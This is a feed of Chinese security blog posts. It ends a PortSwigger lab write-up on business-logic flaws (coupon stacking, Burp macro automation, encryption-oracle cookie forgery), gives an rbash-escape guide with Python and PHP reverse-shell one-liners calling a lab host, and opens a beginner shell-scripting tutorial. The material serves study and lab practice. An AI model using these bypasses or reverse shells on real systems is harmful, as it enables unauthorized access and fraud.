<p>使用 <code>wiener:peter</code> 登录，登录流程为：</p>
<ol type="1">
<li>输入用户名、密码；</li>
<li>第一步验证正确，选择角色；</li>
<li>选择完进入 <code>my-account</code> 界面；</li>
</ol>
<p>根据靶场名称，应该是跳过上面三步的某一步，第 3 步明显跳不过，那么只能
1、2，先尝试跳过第一步，也就是直接抓 <code>role-selector</code>
的包发送，提示</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-41.png" /></p>
<p>那么就跳第二步，输入给的用户名和密码之后，浏览器会去请求
<code>role-selector</code> 页面：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-42.png"
alt="business logic vulnerabilities-42" />
<figcaption aria-hidden="true">business logic
vulnerabilities-42</figcaption>
</figure>
<p>直接丢弃这个请求包，然后会出现一个 burpsuite 报错的界面，不用管，直接
url 访问主页面，也就是没有任何路径的页面:</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-44.png"
alt="business logic vulnerabilities-44" />
<figcaption aria-hidden="true">business logic
vulnerabilities-44</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-43.png"
alt="business logic vulnerabilities-43" />
<figcaption aria-hidden="true">business logic
vulnerabilities-43</figcaption>
</figure>
<p>可以看到，此时默认登录了 <code>administrator</code>
用户，接下来只要删除 <code>carlos</code> 就可以了。</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-45.png"
alt="business logic vulnerabilities-45" />
<figcaption aria-hidden="true">business logic
vulnerabilities-45</figcaption>
</figure>
<h2 id="特定领域的缺陷">4.4. 特定领域的缺陷</h2>
<p>在许多情况下，您会遇到特定于业务领域或网站用途的逻辑缺陷。</p>
<p>在线商店的折扣功能是寻找逻辑缺陷时的经典攻击面。对于攻击者来说，这可能是一个潜在的金矿，在应用折扣的方式中会出现各种基本逻辑缺陷。</p>
<p>例如，假设一家在线商店对超过 1000 美元的订单提供 10%
的折扣。如果业务逻辑在应用折扣后无法检查订单是否已更改，则这可能容易被滥用。在这种情况下，攻击者可以简单地将商品添加到他们的购物车中，直到他们达到
1000
美元的门槛，然后在下订单之前删除他们不想要的商品。然后他们将收到订单的折扣，即使它不再满足预期的标准。</p>
<p>应特别注意根据用户操作确定的标准调整价格或其他敏感值的任何情况。尝试了解应用程序使用什么算法来进行这些调整，以及在什么时候进行这些调整。这通常涉及操纵应用程序，使其处于应用调整不符合开发人员预期的原始标准的状态。</p>
<p>要识别这些漏洞，您需要仔细考虑攻击者可能有什么目标，并尝试使用提供的功能找到实现此目标的不同方法。这可能需要一定程度的特定领域知识，以便了解在给定上下文中什么可能是有利的。举个简单的例子，你需要了解社交媒体才能理解强迫大量用户关注你的好处。</p>
<p>如果不了解该领域，您可能会忽略危险行为，因为您根本不知道其潜在的连锁反应。同样，您可能很难将这些点连接起来，并注意到如何以有害的方式组合两个功能。为简单起见，本主题中使用的示例特定于所有用户都已经熟悉的域，即在线商店。但是，无论您是漏洞赏金猎人、渗透测试，还是只是一名试图编写更安全代码的开发人员，您都可能在某个时候遇到来自不太熟悉的领域的应用程序。在这种情况下，您应该尽可能多地阅读文档，并在可能的情况下与该领域的主题专家交谈以获取他们的见解。这听起来工作量很大，但领域越模糊，其他测试人员就越有可能错过大量错误。</p>
<p>靶场 1：<a
href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules">Lab:
Flawed enforcement of business rules | Web Security Academy</a></p>
<p>首先登录，然后发现送了一张 5
元优惠券。但是尝试在购物车使用，发现只能使用一次（废话）。</p>
<p>滑到 <code>home</code> 页面的底部有一个 <code>sign up</code>
功能，随便输入格式 <code>xxx@xxx</code>，得到又一张优惠券
<code>SIGNUP30</code>，此时可以同时使用两张优惠券了。</p>
<p>漏洞就发生在这里，如果交替的不断添加这两张优惠券，发现可以一直叠加，但如果两次请求是同一张优惠券，则会提示优惠券已经使用。那就不断交替叠加优惠券，直到买得起。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-46.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-47.png" /></p>
<hr />
<p>靶场 2：<a
href="https://portswigger.net/web-security/logic-flaws/examples">Examples
of business logic vulnerabilities | Web Security Academy</a></p>
<p>注意题目：无线金币的逻辑漏洞。</p>
<p>经过测试发现，可以获得一张 7
折优惠券（跟上个靶场一样），并且有一个商品叫
<code>gift card</code>，售价 10 元，购买后会给一串字符串，在
<code>my account</code> 界面输入可以获得 10
元，如果使用优惠券，则一次就能净赚 3 元。</p>
<p>测试到这，我想着，优惠券能否多次使用？于是又买了一件
<code>gift card</code>，发现还真可以：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-48.png"
alt="business logic vulnerabilities-48" />
<figcaption aria-hidden="true">business logic
vulnerabilities-48</figcaption>
</figure>
<p>因此，可以利用这个漏洞一直刷金币：</p>
<ol type="1">
<li>使用优惠券买 <code>gift card</code> 可以赚 3 元；</li>
</ol>
<p>只要买几百次就有钱买 jacket
了。原理不难，但如果都是手动操作明显不太现实，所以需要使用 burpsutie
进行自动化操作，分析流量，发现总的就是这 5 步：</p>
<ol type="1">
<li><code>POST /card</code>，将 gift card 加入购物车；</li>
<li><code>POST /card/coupon</code>，使用优惠券；</li>
<li><code>POST /cart/check</code>，检测能否买得起，此时就已经付了钱；</li>
<li><code>GET /cart/order-confirmation?order-confirmed=true</code>，确认购买；</li>
<li><code>POST /gift-card</code>，使用 gift card；</li>
</ol>
<p>第一步，打开 <code>Project Options</code> 选项，在
<code>Session Handling Rules</code> 下的 <code>Sessions</code> 下选择
<code>Add</code>：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-49.png"
alt="business logic vulnerabilities-49" />
<figcaption aria-hidden="true">business logic
vulnerabilities-49</figcaption>
</figure>
<p>第二步，在 <code>scope</code> 的 <code>URL Scope</code> 下选择
<code>include all URLs</code>:</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-50.png" /></p>
<p>第三步，回到 <code>Details</code> 下，在 <code>Rule Actions</code>
下选择 <code>Add -&gt; Run a marco</code> ：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-51.png"
alt="business logic vulnerabilities-51" />
<figcaption aria-hidden="true">business logic
vulnerabilities-51</figcaption>
</figure>
<p>第四步，在 <code>selecct marco</code> 下点击
<code>Add</code>，然后选择上面的 5 个请求（按住 <code>ctrl</code>
加鼠标左键可以选择多个），注意顺序</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-52.png" /></p>
<p>第 5 步，选择第 4 个请求，点击 <code>configure item</code>，在
<code>Custom parameter locations in response</code> 下选择
<code>Add</code>，<code>parameter name</code> 见下图，然后高亮第一个
<code>Code</code>：，两次 OK 回到 <code>Marco Editor</code> 界面：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-53.png" /></p>
<p>第 6 步，选择第 5 个请求，点击
<code>Configure item</code>，这里只需要将 <code>gitf-card</code>
参数设置为 <code>reponse 4</code>，可以选择 <code>Test macro</code>
来确保 gift-card 参数匹配并确认它收到了302 响应，然后一直 ok 回到 burp
窗口：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-54.png" /></p>
<p>最后一步，将 <code>GET /my-account</code> 的请求发送给
<code>intruder</code> 模块，清除 <code>payload</code>，然后如下设置</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-55.png"
alt="business logic vulnerabilities-55" />
<figcaption aria-hidden="true">business logic
vulnerabilities-55</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-56.png"
alt="business logic vulnerabilities-56" />
<figcaption aria-hidden="true">business logic
vulnerabilities-56</figcaption>
</figure>
<p>最后点击 <code>start attack</code> 等待攻击结束就有钱买 jacket
了。</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-57.png"
alt="business logic vulnerabilities-57" />
<figcaption aria-hidden="true">business logic
vulnerabilities-57</figcaption>
</figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-58.png" /></p>
<p>成因：对应优惠券没做限制，优惠券应该只能使用一次，使用一次后就作废了。</p>
<h2 id="提供-encryption-oracle">4.5. 提供 encryption oracle</h2>
<p>当用户可控制的输入被加密并且生成的密文以某种方式提供给用户时，可能会发生危险情况。这种输入有时被称为“encryption
oracle”。攻击者可以使用此输入使用正确的算法和非对称密钥来加密任意数据。</p>
<p>当应用程序中有其他用户可控制的输入期望使用相同算法加密数据时，这会变得很危险。在这种情况下，攻击者可能会使用
encryption oracle生成有效的加密输入，然后将其传递给其他敏感函数。</p>
<p>如果站点上有另一个用户可控制的输入提供反向功能（解密），则此问题可能会更加复杂。这将使攻击者能够解密其他数据以识别预期的结构。这为他们节省了一些创建恶意数据所涉及的工作，但不一定是成功利用漏洞所必需的。</p>
<p>encryption oracle 的严重性取决于哪些功能也使用与 oracle
相同的算法。</p>
<p>简单理解：</p>
<ul>
<li>如果加密后的密文让攻击者得到，攻击者可以使用原文和密文去推测加密算法，如果加密算法被破解，那么攻击者就可以随意构造输入。</li>
<li>如果其他用户也使用相同的加密算法，那么攻击者就可以伪造请求；</li>
<li>如果有用户的功能可以解密，攻击者构造的 payload
经过加密后的数据可以使用解密功能解密，验证破解的加密算法是否正确；</li>
</ul>
<p>靶场：<a
href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle">Lab:
Authentication bypass via encryption oracle | Web Security
Academy</a></p>
<p>登录 <code>wiener:peter</code> 记住选择
<code>stay login in</code>，这之后 cookie 中会携带参数
<code>stay-logged-in</code>，这是一个加密的内容，而且没法解密。</p>
<p>在 <code>Update email</code>
中，如果邮箱格式不对，服务器会返回一个响应包，其中有一个参数：<code>notification</code>，记过多次测试，发现随着输入邮箱的值不同，<code>notification</code>
的值也不同，流程如下：</p>
<ol type="1">
<li>输入邮箱值为 1；</li>
<li>服务器返回
<code>notification=4EWiYrpeyNMJO2HEBim%2fLw%2bDbwrXzVYSuqayS45lnsc%3d</code>；</li>
<li>浏览器请求 <code>my-account</code> 界面，携带
<code>notification</code>，然后页面出现
<code>Invalid email address:1</code>；</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-59.png" /></p>
<p>可以合理推测：输入的邮箱值经过某种加密变成了
<code>notification</code> 的值，然后浏览器携带 <code>notification</code>
的值请求服务器，服务器收到后将其解码，得到
<code>Invalid email address:1</code>。</p>
<p>而 <code>stay-logged-in</code> 也是一个加密字段，如果将
<code>notification</code> 的值修改成 <code>stay-logged-in</code>
的值是否也会被解密？</p>
<p>拦截 <code>update email</code> 之后的第一次请求的响应，修改
<code>notification</code> 为 <code>stay-logged-in</code> 的值：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-60.png" /></p>
<p>发现确实被解密出来了：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-61.png" /></p>
<p>发现这和时间戳有点像：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-63.png" /></p>
<p>那我们可以构造 <code>administrator:时间戳</code> 作为
<code>email</code> 的值，然后在第一次请求的响应中获得
<code>notification</code>，需要注意系统会自动在最前面添加 23
个字节，也就是 <code>Invalid email address:</code>，所以需要把
<code>notification</code> 先 url 解密、再 base 64 解密，然后删除前 23
个字节，在 base 64 编码、url 编码，得到新的 notification
值放入响应包，然后放行，第二个请求会自动使用新的
notification，此时解密报错，说 notification 的字节数必须是 16
的倍数。</p>
<p>系统拿到我们的值如果加密后不足 16 的倍数，应该是自动增加一些
padding，而我们将系统构造好的删除了 23
个字节，导致报错，所以可以构造：<code>xxxxxxxxxadministrator:时间戳</code>，前面有
9 个字节，这样将系统返回的 notification 删除 32 个字节就正好剩下
<code>administrator:时间戳</code>：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-64.png" /></p>
<p>官网接下来的步骤：去 <code>proxy history</code> 中找一个
<code>GET /</code> 的请求，然后将 <code>cookie</code> 中的
<code>session</code> 全部删除，把 <code>stay-logged-in</code> 修改成删除
32 个字节之后的经过 base 64、url 编码的内容，然后就可以以
<code>administrator</code> 登录，之后访问 <code>/admin</code> 删除
<code>carlos</code> 即可。</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-65.png"
alt="business logic vulnerabilities-65" />
<figcaption aria-hidden="true">business logic
vulnerabilities-65</figcaption>
</figure>
<blockquote>
<p>原来是我 Linux 的 burpsuite 有问题，烦</p>
</blockquote>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-66.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/business%20logic%20vulnerabilities-67.png" /></p>
<p>这里体现的就是一个 web
应用内，既可以加密，也可以解密，并且使用的是同一套算法，就会导致该问题。</p>
<h1 id="防御">6. 防御</h1>
<p>简而言之，防止业务逻辑漏洞的关键是：</p>
<ol type="1">
<li>确保开发人员和测试人员了解应用程序服务的领域；</li>
<li>避免对用户行为或应用程序其他部分的行为做出隐含的假设；</li>
</ol>
<p>应该确定对服务器端状态做出了哪些假设，并实施必要的逻辑来验证这些假设是否得到满足。这包括在继续处理业务之前确保任何输入的值都是合理的。</p>
<p>同样重要的是要确保开发人员和测试人员能够完全理解这些假设以及应用程序在不同场景中应该如何反应。
这可以帮助团队尽早发现逻辑缺陷。
为促进这一点，开发团队应尽可能遵守以下最佳实践：</p>
<ul>
<li>为所有事务和工作流维护清晰的设计文档和数据流，注意在每个阶段所做的任何假设。</li>
<li>尽可能清楚地编写代码。
如果很难理解应该发生什么，就很难发现任何逻辑缺陷。
理想情况下，编写良好的代码不需要文档来理解它。
在不可避免的复杂情况下，生成清晰的文档对于确保其他开发人员和测试人员了解所做的假设以及预期的行为是什么至关重要。</li>
<li>注意对使用每个组件的其他代码的任何引用。
如果恶意方以不寻常的方式操纵这些依赖项，请考虑这些依赖项的任何副作用。</li>
</ul>
<p>由于许多逻辑缺陷的相对独特性，很容易将它们作为人为错误造成的一次性错误而忽略并继续前进。然而，正如我们已经证明的那样，这些缺陷通常是构建应用程序的初始阶段不良做法的结果。首先分析为什么存在逻辑缺陷，以及团队是如何忽略它的，可以帮助您发现流程中的弱点。通过进行微小的调整，您可以增加类似缺陷在源头上被切断或在开发过程中及早发现的可能性。</p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>burpsuite</category>
        <category>业务逻辑漏洞</category>
      </categories>
      <tags>
        <tag>burpsuite</tag>
        <tag>业务逻辑漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>rbash 逃逸</title>
    <url>/2022/05/11/rbash%20%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<p>个人的知识点总结。</p>
<span id="more"></span>
<h1 id="简介">1. 简介</h1>
<p>rbash是 Restricted Bash
的缩写，即受限制的bash。管理员可以通过指定其他用户的bash为rbash，以此来限制用户的相关操作。在rbash中，很多操作和命令都会受到限制，比如：</p>
<ol type="1">
<li>使用cd更改目录；</li>
<li>设置或者取消环境变量的设置；</li>
<li>指定包含参数 / 的文件名。也就是不能够执行一些文件；</li>
<li>指定包含参数 - 的文件名；</li>
<li>使用重定向输出 &gt;, &gt;&gt;, &gt;|, &lt;&gt;, &gt;&amp;, &amp;&gt;
等</li>
</ol>
<p>因此，在渗透过程中，获得一个rbash对后续的操作会影响到后面的操作，所以才需要绕过rbash。</p>
<h1 id="绕过方法">2. 绕过方法</h1>
<p>使用的环境很简单，为 Ubuntu20.04 LTS。</p>
<p>首先输入如下命令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adduer [username]</span><br></pre></td></tr></table></figure></p>
<p>然后按照提示输入相关信息即可创建一个新用户。</p>
<p>接着，修改/etc/passwd。将新建的用户的/bin/bash 修改为/bin/rbash</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511154143.png" /></p>
<p>此时，m1ku的bash则为rbash，不能执行一些操作，比如切换到根目录</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511154226.png" /></p>
<p>hacking articls 中提出 <strong>Method to Bypass rbash</strong>:</p>
<ol type="1">
<li>Bypass rbash using Editors
<ol type="1">
<li>vi-editors</li>
<li>Ed-editors</li>
</ol></li>
<li>Bypass rbahs using One Liner
<ol type="1">
<li>Python</li>
<li>Perl</li>
<li>Awk</li>
</ol></li>
<li>Bypass rbash using througn Reverser Shell</li>
<li>Bypass rbash using Sytem binaries
<ol type="1">
<li>More</li>
<li>Less</li>
<li>Man</li>
</ol></li>
<li>Bypass rbash using Expect</li>
<li>Bypass rbash using SSH</li>
</ol>
<p>将rbash的绕过分成了6个部分：</p>
<ol type="1">
<li>使用Linux的vi或者ed编辑器，执行一个新的shell；</li>
<li>使用一种语言来执行命令，返回一个无限制的shell；比如python中的os库来执行/bin/bash</li>
<li>使用系统命令或者php之类的额，反弹一个系统shel到攻击主机上；</li>
<li>利用系统中的二进制文件来绕过，这里给出的为more, less, man；</li>
<li>利用 expect 绕过</li>
<li>利用 ssh 绕过</li>
</ol>
<h2 id="编辑器绕过">2.1. 编辑器绕过</h2>
<h3 id="vivim">2.1.1. vi/vim</h3>
<p>进入到 vi/vim 中将设立了修改为/bin/bash，命令如下： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. vim</span><br><span class="line">2. :<span class="built_in">set</span> shell=/bin/bash</span><br><span class="line">3. :shell</span><br></pre></td></tr></table></figure></p>
<p>后两条命令需要在vi/vim的命令模式下输入</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511154432.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511154449.png" /></p>
<p>此时，虽然显示还是rbash，但是已经可以正常的进行相关操作了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511154538.png" /></p>
<p>原理：就是利用 vi/vim 启动了一个shell的进程，该shell为/bin/bash。</p>
<h3 id="ed">2.1.2. ed</h3>
<p>命令如下： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. ed</span><br><span class="line">2. !/bin/bash</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511155329.png" /></p>
<h2 id="编程语言绕过">2.2. 编程语言绕过</h2>
<h3 id="python">2.2.1. Python</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import os;os.system(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511155602.png" /></p>
<p>也可以使用python获得交互式shell的命令来绕过： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="perl">2.2.2. Perl</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&quot;system(&#x27;/bin/bash&#x27;);&quot;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511155850.png" /></p>
<h3 id="awk">2.2.3. Awk</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511160020.png" /></p>
<h2 id="反弹shell绕过">2.3. 反弹shell绕过</h2>
<h3 id="python-反弹">2.3.1. Python 反弹</h3>
<p>首先在kali上监听端口： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure></p>
<p>然后，在要绕过的主机上执行下面命令：（IP和端口为kali的）
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511160553.png" /></p>
<h3 id="php-反弹">2.3.2. PHP 反弹</h3>
<p>同上，不过是反弹shell命令不同罢了。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.2.4&quot;,3333);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="二进制文件绕过">2.4. 二进制文件绕过</h2>
<p>使用该方法是有条件的，那就是当前目录下需要有可以读的文件。不过一般都能满足，因为一般情况下，家目录下都会有
.bashrc 这样的文件。</p>
<h3 id="more">2.4.1. more</h3>
<p>使用的条件比较苛刻：</p>
<ol type="1">
<li>要么文件内容很多，一个屏幕显示不全</li>
<li>我们自己把命令行的窗口调小，或者利用stty将显示的行数减少</li>
</ol>
<p>总之，就是不能让内容显示全即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. more filename</span><br><span class="line">2. !<span class="string">&#x27;bash&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511162726.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511162739.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511162751.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511162810.png" /></p>
<h3 id="less">2.4.2. less</h3>
<p>该命令就没有more的限制。直接输入如下命令即可： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. less filename</span><br><span class="line">2. !<span class="string">&#x27;bash&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511162952.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511163018.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511163034.png" /></p>
<h3 id="man">2.4.3. man</h3>
<p>该方法不需要有可读文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. man man</span><br><span class="line">2. !<span class="string">&#x27;bash&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="expect-绕过">2.5. expect 绕过</h2>
<p>expect是免费的编程工具，用来实现自动的交互式任务。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. expect</span><br><span class="line">2. bash</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511163535.png" /></p>
<h2 id="ssh-绕过">2.6. SSH 绕过</h2>
<p>使用该方法的条件：</p>
<ol type="1">
<li>开启ssh服务</li>
<li>知道用户的密码</li>
</ol>
<p>命令如下： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. ssh m1ku@10.0.2.21 -t <span class="string">&quot;bash --noprofile&quot;</span></span><br><span class="line">2. 输入密码即可</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511164041.png" /></p>
<h2 id="sh-bash-zsh-dash-绕过">2.7. sh, bash, zsh, dash 绕过</h2>
<p>如果主机上存在其他的shell，比如说sh，bash，zsh，这是比较常见三种，就可以直接输入：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh</span><br></pre></td></tr></table></figure></p>
<p>或者 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash</span><br></pre></td></tr></table></figure></p>
<p>或者 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zsh</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220511164409.png" /></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>rbash逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title>shell编程</title>
    <url>/2022/05/27/shell%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<p>个人的知识点记录。</p>
<span id="more"></span>
<h1 id="shell概述">1. shell概述</h1>
<p>shell是一个命令行解释器，它接收应用程序/用户的命令，然后调用操作系统内核。除此之外，shell还是一门编程语言。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526224512.png" /></p>
<h1 id="shell解析器">2. shell解析器</h1>
<p>可以在Linux中输入 <code>cat /etc/shells</code> 查看有哪些解析器</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526224716.png" /></p>
<p>[[bash 和 sh 的区别]]</p>
<p>kali中默认的是 zsh，可以输入 <code>echo $SHELL</code>
查看默认的shell，也可以 <code>cat /etc/passwd</code> 查看</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526224919.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526224939.png" /></p>
<h1 id="shell脚本入门">3. shell脚本入门</h1>
<h2 id="第一个shell脚本-hello-world">3.1. 第一个shell脚本-hello
world</h2>
<ol type="1">
<li><p>脚本格式</p>
<p>脚本以 <code>#!/bin/bash</code> 开头（指定解析器）</p></li>
<li><p>第一个 shell 脚本: helloworld.sh</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">echo &quot;hello world&quot;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526225327.png" /></p></li>
</ol>
<h2 id="不同执行方式的区别">3.2. 不同执行方式的区别</h2>
<p>大致有以下两种执行方式（1和其他）： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. ./helloworld.sh # 后面程序可以使用绝对路径 or 相对路径</span><br><span class="line">2. bash helloworld.sh # 后面程序可以使用绝对路径 or 相对路径</span><br><span class="line">3. sh helloworld.sh  # 后面程序可以使用绝对路径 or 相对路径</span><br><span class="line">4. ...</span><br></pre></td></tr></table></figure></p>
<p>第一条命令和后两条命令是不一样的。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526225913.png" /></p>
<p>就算没有执行权限，使用 <code>bash file</code>
的方式还是可以执行的，而 <code>./file</code>
的方式则会提示失败。这是因为前者是<strong>调用了 bash
读取脚本文件中的内容，然后执行命令，所以只需要有读取权限
即可</strong>。而后者是用户把整个文件当作一个可执行文件执行，所以需要该用户具有执行权限。</p>
<p>如果没有读取权限，<code>bash file</code> 方式也会失效</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526230510.png" /></p>
<p>如果只有读取权限，<code>bash file</code> 方式也能成功</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526230545.png" /></p>
<h2 id="第二个shell脚本-多命令处理">3.3. 第二个shell脚本-多命令处理</h2>
<p>需求：在 /home/m1ku/shellLearn 目录下添加一个文件
secret.txt，并且向该文件中写入“Just a joke!”。用一个脚本 add.sh
完成。</p>
<p>命令如下： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">cd /home/m1ku/shellLearn # 来到目录</span><br><span class="line">touch secret.txt # 新建文件</span><br><span class="line">echo &quot;Just a joke!&quot; &gt; secret.txt # 写入内容</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>注意：<code>&gt;</code>是覆盖文件中的内容；<code>&gt;&gt;</code>是向文件中追加内容</p>
</blockquote>
<p>执行前：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526231429.png" /></p>
<p>执行后：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526231451.png" /></p>
